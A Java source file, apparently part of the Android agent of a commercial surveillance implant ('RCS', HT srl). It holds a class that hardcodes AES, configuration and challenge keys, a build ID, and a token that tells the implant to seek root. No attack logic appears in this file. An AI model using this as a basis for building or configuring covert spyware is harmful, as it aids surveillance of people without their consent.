/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : KeysFake.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class KeysFake.
 */
public class KeysFake extends Keys {
	private static final String TAG = "KeysFake";
	
	// RCS 816 "Test8" su castore
	byte[] AesKey = Utils.hexStringToByteArray("43ddcdb58f42216465e0bad6a0e9214f8b30abd8351d96c9d5668384fbc5e22e", 0,
			32);
	byte[] ConfKey = Utils.hexStringToByteArray("49d1e153429bdc361a0aa842625c0aeeade8eca013f2c5110f01bfc453072c0a", 0,
			32);
	byte[] ChallengeKey = Utils.hexStringToByteArray(
			"572ebc94391281ccf53a851330bb0d99138ffe67fc695da3281e51dc8d79b32e", 0, 32);
	String BuildId = "RCS_0000000816";

	// Get root
	byte[] RootRequest = "IrXCtyrrDXMJEvOU".getBytes();
	
	// Don't get root
	//byte[] RootRequest = "IrXCtyrrDXMJEvOUbs".getBytes();

	public KeysFake() {
		super(false);
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (KeysFake) wants privilege: " + wantsPrivilege());
		}
	}

	protected byte[] getRootRequest() {
		return RootRequest;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getAesKey()
	 */
	@Override
	public byte[] getAesKey() {
		return AesKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getChallengeKey()
	 */
	@Override
	public byte[] getChallengeKey() {
		return ChallengeKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getConfKey()
	 */
	@Override
	public byte[] getConfKey() {
		return ConfKey;
	}

	/*
	 * public byte[] getInstanceId() { return g_InstanceId; }
	 */

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getBuildId()
	 */
	@Override
	public byte[] getBuildId() {
		return BuildId.getBytes();
	}
}
